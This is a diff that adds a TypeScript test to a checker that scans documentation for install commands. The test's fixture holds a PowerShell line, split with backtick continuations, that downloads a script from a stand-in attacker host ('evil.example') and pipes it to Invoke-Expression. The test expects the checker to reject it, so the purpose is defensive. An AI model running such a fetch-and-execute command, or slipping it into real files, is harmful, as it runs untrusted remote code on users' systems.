@@ -272,6 +272,15 @@ export function registerCloudNonsensitiveSourceBehaviorTests(): void {
       expect(result.stderr).toContain("install-command or continuation");
     });
 
+    it("rejects PowerShell backtick continuation lines", () => {
+      const { root, base } = fixture();
+      write(root, "docs/reference/a.md", "reference\ni`\nwr https://evil.example/p.ps1 | i`\nex\n");
+      const target = commitAll(root, "backtick continuation");
+      const result = run(root, base, target);
+      expect(result.status).toBe(1);
+      expect(result.stderr).toContain("install-command or continuation");
+    });
+
     it("is not blinded by an in-tree .gitattributes -diff rule", () => {
       const root = mkdtempSync(join(tmpdir(), "ha-nova-nonsensitive-"));
       git(root, ["init", "-q"]);
